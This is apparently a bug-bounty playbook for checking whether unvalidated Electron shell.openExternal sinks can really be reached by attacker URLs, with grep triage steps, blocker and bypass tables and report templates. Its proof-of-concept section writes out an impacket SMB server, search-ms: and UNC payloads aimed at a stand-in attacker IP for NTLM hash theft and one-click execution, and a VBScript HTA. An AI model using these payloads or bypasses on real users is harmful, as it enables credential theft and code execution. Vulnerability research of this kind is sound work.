---
type: playbook
title: "Electron Delivery Chain Validation Gate"
tags: [electron, shell.openExternal, ipc, delivery-chain, url-scheme, desktop, cwe-20]
status: draft
last_updated: 2026-08-12
category: hunting
estimated_time: "30-45 min"
---

# Playbook - Electron Delivery Chain Validation Gate

> **Core question**: you found `shell.openExternal(url)` with no validation on `url` — is that enough to submit a report?
> No. **A vulnerable sink existing does not mean an attacker-controlled scheme can reach it.** If any layer in between — the server, a WebSocket handler, an IPC handler — filters the value, the finding does not hold.

---

## Scope / When to use

Run this playbook's three-layer gate **before submitting or drafting a report** for any Electron finding involving one of these sinks:

- `shell.openExternal(url)`
- `window.open(url, ...)` with disposition `other` / `foreground-tab`
- Context-menu "Open Link in Browser"
- `setWindowOpenHandler` returning `{ action: "allow" }`
- Any native wrapper such as `ShellExecuteEx` / `createProcess`

**Trigger conditions**:
- The Electron app carries a URL through a chat message, notification, WebSocket event, or IPC message.
- You found a `shell.openExternal` sink, but the entry point is server-side.
- You found a UNC / custom-scheme payload but aren't sure whether a middle layer filters it.

---

## Phases

### Phase 1: Layer 1 — Attacker Input Point

Question: **where can the attacker inject a non-http(s) scheme URL?**

#### Checklist

```
[ ] Chat message / comment field: does it allow search-ms:// smb:// ftp:// ms-word: or other arbitrary URLs?
[ ] WebSocket / SignalR / Socket.io frame: does the message payload contain a URL field?
[ ] IPC message (preload -> ipcRenderer.send): does it forward a renderer-supplied URL without validation?
[ ] Server push notification / webhook callback: is the payload URL field attacker-controllable?
[ ] Custom-scheme URL (e.g. a vendor app's own scheme handler): does the handler accept a URL embedded in eventData without validation?
[ ] Electron version: does it support new-window disposition=other as a bypass? (see Known Bypasses)
```

#### How to check

```bash
# Static: find ipcMain handler and ipcRenderer.send call sites
grep -rn "ipcMain\.on\|ipcMain\.handle\|ipcRenderer\.send" /tmp/extracted/ --include="*.js"

# Static: find WebSocket / SignalR message URL fields
grep -rn "ws\.\|socket\.on\|hub\.on\|connection\.on" /tmp/extracted/ --include="*.js" | grep -i "url\|link\|href"

# Static: find the custom-scheme handler's action dispatcher
grep -rn "registerFileProtocol\|protocol\.handle\|protocol\.registerStreamProtocol\|app\.setAsDefaultProtocolClient" /tmp/extracted/ --include="*.js"
```

**Layer 1 PASS condition**: at least one attacker-controllable entry point exists, capable of injecting a non-http scheme string that is not filtered client-side before injection.

---

### Phase 2: Layer 2 — Middle-Layer Pass-Through

Question: **does the server / WebSocket handler / IPC handler filter or transform the URL before it reaches the renderer?**

This is the most common source of false positives. A canonical failure case: a chat server received the message and, before pushing it to the renderer, converted `search-ms:` into a plain-text preview card — the sink the renderer eventually calls never receives the original scheme.

#### Middle layers to check

| Layer type | Common implementation | Question to ask |
|------------|------------------------|-------------------|
| **Chat server URL processing** | Converts URL into a text card / preview | Is the scheme normalized to `https://` or plain text? |
| **WebSocket / SignalR message broker** | Relays messages | Is there a message sanitizer / URL validator? |
| **IPC bridge (preload)** | API exposed via contextBridge | Is a scheme allowlist applied before exposure? |
| **Renderer parse layer** | Message -> DOM element / href rendering | Does it use `new URL()` to parse and keep only https? |
| **Electron will-navigate handler** | `webContents.on('will-navigate', ...)` | Is there URL validation? (note: disposition=other can bypass this — see Known Bypasses) |
| **Deep-link dispatcher** | `app.on('open-url', ...)` action dispatcher | Does the custom-scheme's internal action dispatcher filter the URL in eventData? |

#### How to check

```bash
# Static: find URL handling inside the message-processing chain
grep -rn "sanitize\|allowlist\|whitelist\|blocklist\|BLOCKED_PROTOCOLS\|ALLOWED_PROTOCOLS\|isHttpLink\|isValidUrl\|normalizeUrl" \
  /tmp/extracted/ --include="*.js"

# Static: find the will-navigate handler
grep -rn "will-navigate\|will-frame-navigate\|new-window" /tmp/extracted/ --include="*.js"

# Static: find URL scheme filtering logic
grep -rn "\.protocol\|startsWith.*http\|scheme\|url\.parse\|new URL(" /tmp/extracted/ --include="*.js" | head -40

# Dynamic verification (if static analysis is inconclusive):
# Send a message containing search-ms:, intercept the WebSocket frame and see whether
# the server response already converted it. Use Wireshark / mitmproxy to observe the
# server-push message payload.
```

**Layer 2 PASS condition**: you traced the URL's full path from injection point to the renderer sink and confirmed no middle layer performs scheme filtering or URL normalization — the URL **retains its original scheme** all the way to the renderer.

**Layer 2 BLOCK examples** (= stop, not reportable):
- A chat server converts a message's URL into a preview card and drops `search-ms:` in the process
- A deep-link handler replaces the app's own custom scheme with the server origin before navigating
- Server-side linkify only keeps `http(s)://` URLs, filtering everything else

---

### Phase 3: Layer 3 — Electron Sink Reachability

Question: **does the malicious scheme actually reach `shell.openExternal` / `window.open` / context-menu open-link?**

#### Checklist

```
[ ] Find the sink's call site: grep "shell.openExternal\|openExternalUrl\|shell\.openPath" *.js
[ ] The sink's url parameter comes directly from renderer / IPC / message, with no additional filtering right before the call
[ ] Confirm the sink has no scheme allowlist: if (protocol !== 'https:') return  <- this is a BLOCK
[ ] Confirm the sink has no UNC rejection: if (url.startsWith('\\\\')) return  <- this is a BLOCK
[ ] If a "skip validation" flag pattern exists: confirm whether it can be set by the attacker
[ ] Confirm whether disposition="other" bypasses will-navigate in this Electron version
```

#### How to check

```bash
# Find every shell.openExternal call site and read the surrounding 10 lines
grep -rn "openExternal\|shell\.open" /tmp/extracted/ --include="*.js" -A 5 -B 5

# Trace where the url value comes from (follow data flow to the call site)
# If url = ipc arg passed directly -> Layer 3 PASS
# If url = new URL(raw).href and only https is accepted -> Layer 3 BLOCK

# Look for a "skip validation" style flag
grep -rn "skipValidityCheck\|skipValidation\|forceOpen\|trusted" /tmp/extracted/ --include="*.js"
```

**Layer 3 PASS condition**: the value passed to `shell.openExternal(url)` has no scheme filtering applied right before the call, and neither UNC paths nor non-http schemes are rejected.

---

## Decision Points

### Gate decision tree

```
[Found a shell.openExternal sink]
         |
         v
[Layer 1: can an attacker inject a non-http scheme?]
   NO -> STOP. Record as a negative attempt.
   YES v
[Layer 2: does the middle layer (server/IPC/renderer parse) preserve the scheme unfiltered?]
   BLOCKED -> STOP. Record "delivery chain blocked at [layer name]"
   PASS v
[Layer 3: does the malicious scheme actually reach shell.openExternal with no secondary filtering?]
   BLOCKED -> STOP. Record "sink has an allowlist / UNC rejection"
   PASS v
[All three layers PASS -> can open a Finding -> proceed to evidence-readiness review]
```

**Gate rule (hard)**: all three layers must PASS before you can open a Finding or draft a report. A BLOCK at any layer means it is not reportable — record it as a negative attempt instead.

### Known Middle-Layer Blockers (mechanisms known to block Layer 2)

| Blocker | Real-world example | How to check |
|---------|---------------------|----------------|
| **Chat-server URL scheme allowlist** | A chat server converting `search-ms:` to plain text before push | Send a message, intercept the server push, inspect the payload |
| **Deep-link scheme replacement** | A custom scheme replaced with the server origin before navigation | Trace the deep-link handler's source |
| **Electron will-navigate URL validation** | A validator function checking URL scheme on navigation | `grep -rn "will-navigate" *.js` and read the validator logic |
| **contextBridge allowlist** | Preload only exposes something like `openHttpLink(url)`, filtered before exposure | Read preload.js's `contextBridge.exposeInMainWorld` |
| **SignalR hub server-side sanitizer** | Hub method sanitizes a URL with DOMPurify / regex before returning it | Static review of server code (if available), or dynamic interception of the hub response |
| **linkify-it keeping only http/https** | Renderer linkifies outgoing messages, dropping non-http URLs | grep `linkify` and read its options |

### Known Bypasses (techniques known to punch through Layer 2/3)

| Bypass | Description | Source |
|--------|-------------|--------|
| **`ftp://` missing from a blocklist** | An app blocked `search-ms:` and `smb:` but missed `ftp://` | CVE-2024-37182 (Mattermost) |
| **`smb://` missing from a blocklist** | Blocklist-style defenses almost always miss `smb://` — try it directly | Documented pattern |
| **`disposition="other"` bypasses will-navigate** | The `new-window` event's `disposition="other"` does not fire `will-navigate`; `setWindowOpenHandler` is the only interception point | Documented pattern |
| **A "skip validation" flag bypasses an allowed-protocols list** | A right-click "Open Link" code path carried a flag that skipped the allowlist check | Documented pattern (Ferdium, open-source Electron app) |
| **Custom-scheme action-dispatcher eventData injection** | A custom-scheme handler puts the URL inside an eventData parameter; the dispatcher validates only the action type, not the URL content | Documented pattern |
| **IPC handler without senderFrame validation** | `ipcMain.on` does not validate `event.senderFrame.url`, so any renderer (including an attacker-injected webview) can invoke it | Documented pattern |

### Framing Rules (anti-overclaim check before submission)

| Correct phrasing | Incorrect phrasing |
|-------------------|----------------------|
| "1-click NTLMv2 hash capture via UNC (search-ms: scheme, 0 OS dialogs)" | "Remote Code Execution" listed alone in the title |
| "1-click code execution via UNC .exe, requires a Windows security confirmation dialog (UI:R)" | "0-click RCE" |
| "Electron shell.openExternal with zero URL validation: all non-http schemes pass through" | "Full system takeover" |
| CVSS UI:R (a dialog does appear for .exe/.hta variants) | CVSS UI:N (unless you actually found true 0-dialog code execution) |

---

## Expected Outputs

**Evidence required once all three layers PASS**:

```
[ ] Layer 1 evidence: screenshot or curl showing the injection point accepts a non-http scheme
[ ] Layer 2 evidence:
    - Static: grep output confirming no middle-layer filtering (attach the code snippet)
    - Dynamic (preferred): Wireshark/DevTools Network showing the non-http scheme preserved in the server response
[ ] Layer 3 evidence: shell.openExternal call-site code (grep output + line numbers)
[ ] End-to-end PoC:
    - Statically reachable (lower grade): the code path chain, with a snippet from each layer
    - Dynamically verified (higher grade): screenshot/video showing the OS actually triggered (UNC SMB auth log, or a security warning dialog)
```

**Dynamic-verification PoC template (UNC + impacket)**:

```bash
# Attacker machine
mkdir /tmp/share
cp /usr/share/windows-resources/binaries/whoami.exe /tmp/share/poc.exe
sudo impacket-smbserver SHARE /tmp/share -smb2support -username test -password test123

# Payload (embedded at the entry point once all three layers pass)
# search-ms variant (0-dialog NTLM theft)
search-ms:query=SystemUpdate&crumb=location:\\<ATTACKER_IP>\SHARE&displayname=Windows+Update

# UNC .exe variant (1-click RCE on a fully patched OS)
\\<ATTACKER_IP>\SHARE\poc.exe

# UNC .hta variant (1-click RCE, script-based)
\\<ATTACKER_IP>\SHARE\poc.hta
# poc.hta content: <script language="VBScript">CreateObject("Shell.Application").ShellExecute "calc.exe"</script>

# Watch the impacket log for:
# [*] User WINDOWS\<victim> authenticated successfully  <- NTLM capture
```

**Negative-result record template** (use when any layer BLOCKs):

```markdown
## Attempt: shell.openExternal delivery chain validation
Date: YYYY-MM-DD
Target: <AppName> <version>
Entry point: <description>
Layer 1: PASS -- chat message accepts a search-ms: scheme
Layer 2: BLOCK -- server push converts search-ms: to plain text before delivery
  Evidence: [DevTools Network] response payload: {"text":"search-ms:...","type":"text"} (scheme preserved as text but not <a href>)
Layer 3: N/A (never reached)
Conclusion: NOT REPORTABLE -- delivery chain broken at Layer 2 (server sanitizer)
Lesson: must intercept the server push to confirm scheme preservation; static sink review alone is not enough
```

**Batch audit workflow (scanning many apps)**:

```bash
# Step 1: extract asar (~10 sec/app)
npx asar extract app.asar /tmp/extracted_<appname>

# Step 2: quick Layer 3 sink check
grep -rn "openExternal\|openExternalUrl" /tmp/extracted_<appname>/ --include="*.js" -l

# Step 3: quick Layer 3 filter check
grep -rn "ALLOWED_PROTOCOLS\|BLOCKED_PROTOCOLS\|allowlist\|whitelist\|isHttpLink" /tmp/extracted_<appname>/ --include="*.js"

# Step 4: quick Layer 2 check (server-side sanitizer)
grep -rn "sanitize\|linkify\|normalizeUrl\|convertUrl" /tmp/extracted_<appname>/ --include="*.js"

# Step 5: quick Layer 1 check (entry points)
grep -rn "ipcMain\.on\|ipcMain\.handle\|protocol\.handle\|app\.on.*open-url" /tmp/extracted_<appname>/ --include="*.js"

# Decision: no filtering at any layer -> queue for dynamic verification
#           filtering found at any layer -> read the full logic, check against Known Bypasses
```

**Lifecycle position**: asar extraction / static analysis -> find `shell.openExternal` sink -> run this three-layer gate -> if any layer BLOCKs, record as a negative attempt; if all three PASS, proceed to evidence-readiness review -> attack-chain review (can this chain into another primitive?) -> Finding -> Submission -> report -> feed any new blocker/bypass discovered back into this playbook's tables.

---

## Related

- `Pattern - Electron Custom Scheme Handler Injection`
- `Pattern - Electron contextIsolation Per-Window Variance`
- A dedicated `shell.openExternal` UNC RCE sink pattern (variants / CVEs / severity)
- `Checklist - Electron shell.openExternal Static Analysis Triage`
- `bb-attempt-recorder` skill — negative-result recording format
- `bb-evidence-readiness` skill — dynamic/static verification grading
- `bb-attack-chain-review` skill — whether the finding chains into higher impact
- `bb-knowledge-capture` skill — feeding new blockers/bypasses back into this playbook

---

> **One-line summary**: a vulnerable sink alone isn't enough — trace the URL's full path from the attacker's hands to `ShellExecuteEx`. If any layer in between filters it, the report has no legs to stand on.
